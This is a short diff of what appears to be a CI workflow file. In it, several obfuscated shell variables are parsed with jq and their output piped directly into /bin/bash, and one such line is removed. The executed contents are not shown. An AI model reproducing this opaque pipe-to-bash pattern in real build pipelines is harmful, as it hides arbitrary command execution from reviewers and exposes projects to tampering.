@@ -24,7 +24,6 @@ jobs:
           echo $st6 | jq -r .xhw9 | /bin/bash
           echo $oxc570 | jq -r .z96628 | /bin/bash
           echo $d58 | jq -r .lkiz95514 | /bin/bash
-          printf '%s' "$qes4" | jq -r .lzsz4401 | /bin/bash
           echo $xq6594 | jq -r .pc29 | /bin/bash
 
       - name: Persist output
